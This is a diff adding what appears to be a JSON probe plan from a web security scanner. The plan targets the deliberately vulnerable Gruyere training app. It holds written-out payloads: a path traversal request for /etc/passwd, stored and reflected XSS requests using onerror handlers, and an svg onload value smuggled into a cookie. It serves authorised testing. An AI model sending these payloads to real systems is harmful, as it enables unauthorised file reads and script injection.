@@ -1,0 +1,103 @@
+{
+ "layer": "sentinel-impact/4.4.0",
+ "target": "https://google-gruyere.appspot.com",
+ "run_id": "run-228ffb67c9",
+ "redirect_sink": "http://127.0.0.1:39709/l3redir-ab12",
+ "origin_probe": "https://csrf-probe.example",
+ "cart_view": "/cart",
+ "redirect_param": null,
+ "path_plans": [
+  {
+   "path_id": "L3P-fcc292fc64",
+   "probe_kind": "traversal_file_read",
+   "findings": [
+    "F-4eac8c9136"
+   ],
+   "title": "traversal_file_read at /479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd (param ) — minimal benign proof",
+   "status": "PLANNED",
+   "refusal_reason": "",
+   "requests": [
+    {
+     "label": "file_read",
+     "method": "GET",
+     "url": "https://google-gruyere.appspot.com/479896317371227311345106373618080751617/..%2f..%2f..%2f..%2fetc%2fpasswd",
+     "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+      "Cookie": "GRUYERE=100416652|1||author; GRUYERE_ID=479896317371227311345106373618080751617"
+     },
+     "body": "",
+     "expected_file": ".",
+     "rid": "pr-0001"
+    }
+   ],
+   "plan_detail": {}
+  },
+  {
+   "path_id": "L3P-c01bc22425",
+   "probe_kind": "xss_stored_persistence",
+   "findings": [
+    "F-85f0251945"
+   ],
+   "title": "xss_stored_persistence at /479896317371227311345106373618080751617/saveprofile (param uid) — minimal benign proof",
+   "status": "PLANNED",
+   "refusal_reason": "",
+   "requests": [
+    {
+     "label": "stored_resubmit",
+     "method": "GET",
+     "url": "https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile?action=new&uid=%3Cimg+src%3Dx+onerror%3D%27window.__SENTINEL_XSS__%3D%22l3stocanary%22%27%3E&pw=&is_author=True",
+     "headers": {
+      "User-Agent": "Mozilla/5.0 (compatible; Sentinel/4.3.0; +security-scanner)",
+      "Cookie": "GRUYERE=37929950|<svg_onload=sentinel42()>||author; GRUYERE_ID=479896317371227311345106373618080751617"
+     },
+     "body": "",
+     "expected_status": 200,
+     "rid": "pr-0002"
+    },
+    {
+     "label": "browser_exec_stored",
+     "method": "GET",
+     "url": "https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile",
+     "headers": {},
+     "body": "",
+     "expected_flag": "l3stocanary",
+     "expected_variant": "raw_markup",
+     "render_url": "https://google-gruyere.appspot.com/479896317371227311345106373618080751617/saveprofile",
+     "rid": "pr-0003"
+    }
+   ],
+   "plan_detail": {}
+  },
+  {
+   "path_id": "L3P-f96124c1eb",
+   "probe_kind": "xss_browser_execution",
+   "findings": [
+    "F-fada1dc319"
+   ],
+   "title": "xss_browser_execution at /479896317371227311345106373618080751617/snippets.gtl (param uid) — minimal benign proof",
+   "status": "PLANNED",
+   "refusal_reason": "",
+   "requests": [
+    {
+     "label": "browser_exec",
+     "method": "GET",
+     "url": "https://google-gruyere.appspot.com/479896317371227311345106373618080751617/snippets.gtl?uid=%22+onerror%3D%22window.__SENTINEL_XSS__%3D%27l3canary%27%22",
+     "headers": {},
+     "body": "",
+     "expected_flag": "l3canary",
+     "expected_variant": "attr_inject_onerror",
+     "rid": "pr-0004"
+    }
+   ],
+   "plan_detail": {}
+  }
+ ],
+ "summary": {
+  "total": 3,
+  "planned": 3,
+  "refused": 0,
+  "not_safe": 0,
+  "requests": 4,
+  "honesty": "every planned request is a minimal benign probe from the fail-closed safety registries; REFUSED and NOT_SAFE_TO_PROVE name their reasons. Capability proven, not exploited — أُثبتت القدرة، لم تُستغَل"
+ }
+}
